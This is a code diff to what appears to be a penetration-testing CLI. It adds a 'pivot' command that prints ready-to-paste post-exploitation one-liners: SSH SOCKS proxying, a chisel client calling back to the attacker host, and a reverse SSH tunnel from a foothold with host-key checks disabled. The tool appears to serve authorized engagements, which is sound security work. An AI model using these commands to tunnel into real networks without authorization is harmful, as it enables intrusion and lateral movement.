@@ -2638,6 +2638,59 @@ def cmd_retest(args, store):
     return 0
 
 
+@needs_engagement
+def cmd_pivot(args, store):
+    """Emit the exact command shapes for common pivot
+    patterns from an owned host — SSH SOCKS, chisel client,
+    reverse SSH tunnel. Read-only: doesn't spawn anything;
+    prints ready-to-paste one-liners per pattern.
+
+    Rationale for print-only: pivot processes are long-running
+    + operator-owned; spawning them from fieldkit would leave
+    orphaned procs after fieldkit exits. The operator runs the
+    command themselves + manages the tunnel's lifecycle.
+    """
+    from . import config as config_mod
+    cfg = config_mod.load(store)
+    lhost = cfg.get("lhost") or "<your-lhost>"
+    lport = cfg.get("lport") or 443
+    if not args.host:
+        host = "<foothold-host>"
+        host_user = "<user>"
+    else:
+        host_row = store.host_by_ip(args.host)
+        if host_row is None:
+            _err(f"{args.host!r} is not in the engagement")
+            return 2
+        host = host_row["ip"]
+        # Best-effort: look up a credential proven on this host
+        access = store.access_on(host_row["id"])
+        host_user = "<user>"
+        if access:
+            cred = store.credential_by_id(access[0]["cred_id"])
+            if cred:
+                host_user = cred["username"]
+    print(f"pivot options for {host}:\n")
+    print("=== SSH dynamic SOCKS ===")
+    print(f"  ssh -D {args.socks_port} -q -C -N "
+          f"{host_user}@{host}")
+    print(f"  # then: proxychains -q <tool>  (with '{args.socks_port} "
+          f"127.0.0.1 {args.socks_port}' in /etc/proxychains.conf)\n")
+    print("=== chisel (bidirectional, no SSH) ===")
+    print(f"  # on your host (server):  chisel server -p {lport} --socks5")
+    print(f"  # on the foothold:        chisel client "
+          f"{lhost}:{lport} socks\n")
+    print("=== reverse SSH tunnel (foothold → attacker) ===")
+    print(f"  # on the foothold (needs ssh client + reachable {lhost}:{lport}):")
+    print(f"  ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
+          f"-R {args.socks_port}:127.0.0.1:22 "
+          f"-N tunneluser@{lhost} -p {lport}")
+    print()
+    if not args.host:
+        print("note: pass --host <ip> for host + user context inline")
+    return 0
+
+
 def cmd_cloud_imds(args):
     """Probe AWS/Azure/GCP IMDS from the local host — every
     cloud VM has an unauth-reachable instance-metadata service
@@ -4946,6 +4999,21 @@ the spec is missing that field. `--from-file` reads one credential per line.
                          help="emit machine-readable JSON")
     c_imds.set_defaults(func=cmd_cloud_imds)
     p_cloud.set_defaults(func=lambda a: _missing(p_cloud))
+
+    p_pivot = sub.add_parser(
+        "pivot",
+        help="print pivot-command one-liners (SSH SOCKS, chisel, reverse SSH)",
+        description="Print-only surface — foothold-derived pivot "
+                    "processes are long-running + operator-owned; "
+                    "spawning them from fieldkit would leave orphans. "
+                    "This command reads lhost/lport from engagement "
+                    "config + host+cred context from state to render "
+                    "ready-to-paste commands.")
+    p_pivot.add_argument("--host", metavar="IP",
+                          help="foothold host (default: <foothold-host> placeholder)")
+    p_pivot.add_argument("--socks-port", type=int, default=1080,
+                          help="SOCKS proxy port (default: 1080)")
+    p_pivot.set_defaults(func=cmd_pivot)
 
     p_refresh = sub.add_parser(
         "refresh",
